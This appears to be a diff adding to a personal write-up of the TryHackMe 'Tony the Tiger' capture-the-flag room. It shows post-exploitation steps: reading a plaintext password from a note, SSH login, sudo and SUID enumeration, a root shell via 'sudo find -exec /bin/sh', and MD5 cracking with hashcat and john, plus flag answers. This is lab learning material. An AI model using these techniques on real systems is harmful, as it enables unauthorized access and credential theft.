@@ -479,3 +479,485 @@ The program 'import' can be found in the following packages:
 Ask your administrator to install one of them
 cmnatic@thm-java-deserial:/$ SHELL=/bin/bash script -q /dev/null
 SHELL=/bin/bash script -q /dev/null
+cmnatic@thm-java-deserial:/$ whoami
+cmnatic
+cmnatic@thm-java-deserial:/$
+```
+
+## Privilege Escalation
+```text
+cmnatic@thm-java-deserial:/home/jboss$ ls -lah
+total 36K
+drwxr-xr-x 3 jboss   jboss   4.0K Mar  7  2020 .
+drwxr-xr-x 5 root    root    4.0K Mar  6  2020 ..
+-rwxrwxrwx 1 jboss   jboss    181 Mar  7  2020 .bash_history
+-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
+-rw-r--r-- 1 jboss   jboss   3.6K Mar  6  2020 .bashrc
+drwx------ 2 jboss   jboss   4.0K Mar  7  2020 .cache
+-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
+-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
+-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note
+cmnatic@thm-java-deserial:/home/jboss$ cat .jboss.txt
+THM{50c10ad46b5793704601ecdad865eb06}
+cmnatic@thm-java-deserial:/home/jboss$ cat .bash_history
+touch jboss.txt
+echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
+mv jboss.txt .jboss.txt
+exit
+sudo -l
+exit
+ls
+ls -lah
+nano .bash_history
+ls
+cd ~
+ls
+nano .bash_history 
+exit
+cmnatic@thm-java-deserial:/home/jboss$ cat note
+Hey JBoss!
+
+Following your email, I have tried to replicate the issues you were having with the system.
+
+However, I don't know what commands you executed - is there any file where this history is stored that I can access?
+
+Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)
+
+Password: likeaboss
+
+Kind Regards,
+CMNatic
+
+cmnatic@thm-java-deserial:/home$ cd cmnatic
+cmnatic@thm-java-deserial:~$ ls
+jboss  to-do.txt
+cmnatic@thm-java-deserial:~$ cat to-do.txt
+I like to keep a track of the various things I do throughout the day.
+
+Things I have done today:
+ - Added a note for JBoss to read for when he next logs in.
+ - Helped Tony setup his website!
+ - Made sure that I am not an administrator account 
+
+Things to do:
+ - Update my Java! I've heard it's kind of in-secure, but it's such a headache to update. Grrr!
+
+cmnatic@thm-java-deserial:~$ cd jboss
+cmnatic@thm-java-deserial:~/jboss$ ls
+LICENSE.txt  bin     common         docs              lib
+README.txt   client  copyright.txt  jar-versions.xml  server
+
+cmnatic@thm-java-deserial:~$ cat .bash_history
+sudo apt-get update && sudo apt-get upgrade
+mkdir /mnt/cdrom
+sudo mkdir /mnt/cdrom
+sudo mount /dev/cdrom /mnt/cdrom/
+cd /mnt/cdrom/
+ls
+cp VMwareTools-10.3.10-13959562.tar.gz ~/
+cd ~/
+tar -zxvf VMwareTools-10.3.10-13959562.tar.gz 
+cd vmware-tools-distrib/
+ls
+chmod +x vmware-install.pl 
+./vmware-install.pl 
+sudo ./vmware-install.pl 
+sudo apt-get install screen wget curl
+sudo apt-get install openjdk-7-jre
+sudo apt-get install openjdk-7-jdk
+sudo update-alternatives --config java
+java --home
+java --version
+java -V
+sudo update-alternatives --config java
+sudo nano /etc/environment 
+sudo reboot
+sudo apt-get install htop zip unzip
+ls
+cd jboss/
+ls
+wget https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip
+ls
+unzip jboss-as-distribution-6.1.0.Final.zip 
+ls
+mv jboss-6.1.0.Final jboss
+rm *.zip
+rm *.tar.gz
+sudo rm *.tar.gz
+ls
+rm -R vmware-tools-distrib/
+sudo rm -R vmware-tools-distrib/
+cd jboss/
+ls
+cd bin/
+ls
+chmod +x run.sh 
+./run.sh -b 0.0.0.0
+ls /usr/lib/jvm/java-7-openjdk-amd64/jre/bin
+ls /usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java
+sudo nano /etc/environment 
+source /etc/environment
+./run.sh -b 0.0.0.0
+ls
+nano README-service.txt 
+sudo nano /etc/environment 
+cd ~
+nano .bashrc 
+source .bashrc 
+echo $PATH
+echo $JBOSS_HOME
+nano .bashrc 
+logout
+echo $JBOSS_HOME
+ls
+cd jboss/
+ls
+cd bin/
+ls
+sudo nano /etc/init.d/jboss
+chmod 755 /etc/rc.d/init.d/jboss
+sudo cp /etc/rc.d/init.d/jboss /etc/rc.d/init.d/jboss
+chmod 755 /etc/init.d/jboss
+sudo chmod 755 /etc/init.d/jboss
+jboss start
+sudo chkconfig --add jboss
+/etc/init.d/jboss start
+sudo nano /etc/init.d/jboss
+jboss start
+/etc/init.d/jboss start
+ls
+sudo nano /etc/init.d/jboss
+/etc/init.d/jboss start
+ls
+sudo nano /etc/init.d/jboss
+ls
+nano jboss_init_redhat.sh 
+ps aux | grep jboss
+cd init.d
+cd ../
+ls
+cd server/
+ls
+cd jbossweb-standalone/
+ls
+cd ../../
+cd /etc/default/
+ls
+cd ../
+nano /etc/init.d/jboss 
+sudo nano /etc/init.d/jboss 
+jboss start
+/etc/init.d/jboss start
+ls /home/cmnatic/jboss/bin
+sudo nano /etc/init.d/jboss 
+echo "I see you peeping!"
+/etc/init.d/jboss start
+sudo nano /etc/init.d/jboss 
+sudo /etc/init.d/jboss start
+sudo nano /etc/init.d/jboss 
+sudo /etc/init.d/jboss start
+sudo nano /etc/init.d/jboss 
+sudo /etc/init.d/jboss start
+ls /home/cmnatic/jboss/bin/
+chmod +x /home/cmnatic/jboss/bin/run.sh 
+sudo /etc/init.d/jboss start
+sudo nano /etc/init.d/jboss 
+sudo /etc/init.d/jboss start
+ps aux | grep jboss
+sudo nano /etc/init.d/jboss stop
+cd /home/cmnatic/jboss/bin/
+ls
+echo "I see you peeping! You're on the right lines..."
+nano run.sh 
+nano run.conf
+sudo nano /etc/init.d/jboss stop
+sudo /etc/init.d/jboss stop
+sudo nano /etc/init.d/jboss
+run.sh -c -b 0.0.0.0
+sudo nano /etc/init.d/jboss
+run.sh -b 0.0.0.0 -c
+sudo nano /etc/init.d/jboss
+run.sh -b 0.0.0.0 &
+ls
+nano run.sh 
+ls /home
+nano .bash_history 
+su -l root
+exit
+import TERM=xterm
+SHELL=/bin/bash script -q /dev/null
+
+jboss: likeaboss
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh jboss@10.10.112.241             
+The authenticity of host '10.10.112.241 (10.10.112.241)' can't be established.
+ED25519 key fingerprint is SHA256:vyntdEjxp6aE/lZ35pCYGR3J8QxXrzUpj9eWpK+qCP8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.112.241' (ED25519) to the list of known hosts.
+jboss@10.10.112.241's password: likeaboss
+Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Wed Dec 28 21:41:52 GMT 2022
+
+  System load:  0.47               Processes:           107
+  Usage of /:   10.5% of 18.58GB   Users logged in:     0
+  Memory usage: 4%                 IP address for eth0: 10.10.112.241
+  Swap usage:   0%
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Your Hardware Enablement Stack (HWE) is supported until April 2019.
+Last login: Sat Mar  7 00:35:29 2020
+jboss@thm-java-deserial:~$ whoami
+jboss
+jboss@thm-java-deserial:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
+-rwsr-xr-x 1 root    root        31K May 15  2015 /bin/fusermount
+-rwsr-xr-x 1 root    root        93K Nov 23  2016 /bin/mount
+-rwsr-xr-x 1 root    root        44K May  7  2014 /bin/ping
+-rwsr-xr-x 1 root    root        44K May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root    root        37K May 17  2017 /bin/su
+-rwsr-xr-x 1 root    root        68K Nov 23  2016 /bin/umount
+-rwsr-sr-x 1 daemon  daemon      51K Oct 21  2013 /usr/bin/at
+-rwsr-xr-x 1 root    root        46K May 17  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root    root        41K May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root    root        71K May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root    root        74K Oct 21  2013 /usr/bin/mtr
+-rwsr-xr-x 1 root    root        36K May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root    root        46K May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root    root        23K Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root    root       152K May 29  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root    root        23K May  7  2014 /usr/bin/traceroute6.iputils
+-rwsr-xr-- 1 root    messagebus 304K Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root    root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root    root       431K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root    root        15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-r-sr-xr-x 1 root    root        14K Mar  4  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root    root        14K Mar  4  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-rwsr-xr-- 1 root    dip        340K Jun 12  2018 /usr/sbin/pppd
+-rwsr-sr-x 1 libuuid libuuid     19K Nov 23  2016 /usr/sbin/uuidd
+
+jboss@thm-java-deserial:~$ sudo -l
+Matching Defaults entries for jboss on thm-java-deserial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jboss may run the following commands on thm-java-deserial:
+    (ALL) NOPASSWD: /usr/bin/find
+
+jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh \; -quit
+```
+```text
+# cat /root/root.txt
+QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
+```
+```text
+# cd /home/tony
+```
+```text
+# ls
+```
+```text
+# ls -lah
+total 36K
+drwxr-xr-x 3 tony tony 4.0K Mar  6  2020 .
+drwxr-xr-x 5 root root 4.0K Mar  6  2020 ..
+-rw------- 1 tony tony  341 Mar  7  2020 .bash_history
+-rw-r--r-- 1 tony tony  220 Mar  6  2020 .bash_logout
+-rw-r--r-- 1 tony tony 3.6K Mar  6  2020 .bashrc
+drwx------ 2 tony tony 4.0K Mar  6  2020 .cache
+-rw------- 1 tony tony   10 Mar  7  2020 .nano_history
+-rw-r--r-- 1 tony tony  675 Mar  6  2020 .profile
+-rw------- 1 tony tony   63 Mar  6  2020 .Xauthority
+```
+```text
+# cat .bash_history
+cd /var/www/html
+ls
+cd  posts/
+ls
+nano frosted-flakes/index.html 
+nano my-first-post/index.html 
+nano frosted-flakes/index.html 
+nano my-first-post/index.html 
+cd ../
+ls
+nano index.html 
+cd ~/
+exit
+cd /var/www/html
+ls
+exit
+nano /var/www/html/posts/frosted-flakes/
+nano /var/www/html/posts/frosted-flakes/index.html 
+nano .bash_history 
+exit
+```
+```text
+# cat /root/root.txt | base64 -d
+BC77AC072EE30E3760806864E234C7CF
+
+using crackstation
+
+zxcvbnm123456789
+
+or hashcat
+```
+```text
+┌──(kali㉿kali)-[~/tony_tiger]
+└─$ hashcat -m 0 -a 0 hash_tiger /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789         
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: bc77ac072ee30e3760806864e234c7cf
+Time.Started.....: Wed Dec 28 17:36:27 2022 (1 sec)
+Time.Estimated...: Wed Dec 28 17:36:28 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1221.7 kH/s (0.13ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 231424/14344385 (1.61%)
+Rejected.........: 0/231424 (0.00%)
+Restore.Point....: 230400/14344385 (1.61%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 092496 -> youngc1
+Hardware.Mon.#1..: Util: 38%
+
+Started: Wed Dec 28 17:35:49 2022
+Stopped: Wed Dec 28 17:36:30 2022
+
+or john
+```
+```text
+┌──(kali㉿kali)-[~/tony_tiger]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_tiger --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+zxcvbnm123456789 (?)     
+1g 0:00:00:00 DONE (2022-12-28 17:37) 33.33g/s 7712Kp/s 7712Kc/s 7712KC/s 010325..zach2008
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+```
+*zxcvbnm123456789*
+### Final Remarks, Credits & Further Reading
+Final Remarks
+I hope this was a refreshing CTF, where classic techniques meet new content on THM - all of which are not based around Metasploit!
+This type of attack can prove to be extremely dangerous - as you'd hopefully have discovered by now. It's still very real as _sigh,_ java web applications are still used day-to-day. Because of their nature, "Serialisation" attacks all execute server-side, and as such - it results in being very hard to prevent from Firewalls / IDS' / IPS'.
+For any and all feedback, questions, problems or future ideas you'd like to be covered, [please get in touch in the TryHackMe Discord (following Rule #1)](https://discord.gg/QgC6Tdk)
+So long and thanks for all the fish!
+~[CMNatic](https://tryhackme.com/p/cmnatic)
+Credits
+Again, to reiterate, the provided downloadable material has only slightly been adapted to ensure compatibility for all users across TryHackMe. Generating and executing the payload especially is very user-environment dependant (i.e. Java versions, of which are hard to manage on Linux, etc...)
+Many thanks to [byt3bl33d3r](https://github.com/byt3bl33d3r) for providing a reliable Proof of Concept, and finally to all the contributors towards [Frohoff's Ysoserial](https://github.com/frohoff/ysoserial) which facilitates the payload generation used for this CVE.
+https://github.com/frohoff/ysoserial
+Further Reading
+﻿If you are curious into the whole "Serialisation" and "De-Serialisation" process and how it can be exploited, I recommend the following resources:
+-   [https://www.baeldung.com/java-serialization](https://www.baeldung.com/java-serialization)[](https://www.baeldung.com/java-serialization)
+-   [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)[](http://frohoff.github.io/appseccali-marshalling-pickles/)
+-   [https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)[](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
+-   [https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237](https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237)
+Answer the questions below
+TIL!
+
+## Flags / Answers
+- Tony has started a _totally_ unbiased blog about taste-testing various cereals! He'd love for you to have a read...
+- Answer the questions below
+- This flag will have the formatting of "**THM{}**"
+```text
+- ┌──(kali㉿kali)-[/]
+└─$ curl -s http://10.10.35.101/posts/frosted-flakes/ | grep img
+  <link rel='icon' type='image/x-icon' href="https://i.imgur.com/ATbbYpN.jpg" />
+<p><img src="https://i.imgur.com/be2sOV9.jpg" alt="FrostedFlakes"></p>
+    <img alt="Author Avatar" src="https://i.imgur.com/ATbbYpN.jpg" />
+```
+```text
+- ┌──(kali㉿kali)-[~]
+└─$ wget https://i.imgur.com/be2sOV9.jpg
+--2022-12-28 13:45:09--  https://i.imgur.com/be2sOV9.jpg
+Resolving i.imgur.com (i.imgur.com)... 199.232.32.193
+Connecting to i.imgur.com (i.imgur.com)|199.232.32.193|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 84746 (83K) [image/jpeg]
+Saving to: ‘be2sOV9.jpg’
+
+be2sOV9.jpg                 100%[=========================================>]  82.76K  --.-KB/s    in 0.1s    
+
+2022-12-28 13:45:10 (823 KB/s) - ‘be2sOV9.jpg’ saved [84746/84746]
+```
+```text
+- ┌──(kali㉿kali)-[~]
+└─$ strings be2sOV9.jpg | grep THM 
+}THM{Tony_Sure_Loves_Frosted_Flakes}
+'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ
+```
+- ![222](https://i.imgur.com/be2sOV9.jpg)
+- ***THM{Tony_Sure_Loves_Frosted_Flakes}***
+- Knowledge of the Linux (specifically Ubuntu/Debian)'s file system structure & permissions is expected. If you are struggling, I strongly advise checking out the [Linux Fundamentals module](https://tryhackme.com/module/linux-fundamentals).
+- Answer the questions below
+- This flag has the formatting of "**THM{}**"
+```text
+- cmnatic@thm-java-deserial:/$ find / -type f -name user.txt 2>/dev/null
+
+cmnatic@thm-java-deserial:/$ grep -R "THM{" 2>/dev/null
+
+home/jboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}
+home/jboss/.bash_history:echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
+```
+- ***THM{50c10ad46b5793704601ecdad865eb06}***
+### Escalation!
+- Normal boot-to-root expectations apply here! It is located in /root/root.txt. Get cracking :)
+- Answer the questions below
+- The final flag **does not** have the formatting of **"THM{}"**
+- We will, we will Rock You...
+
+## Notes / Lessons Learned
+[[Thompson]]
+
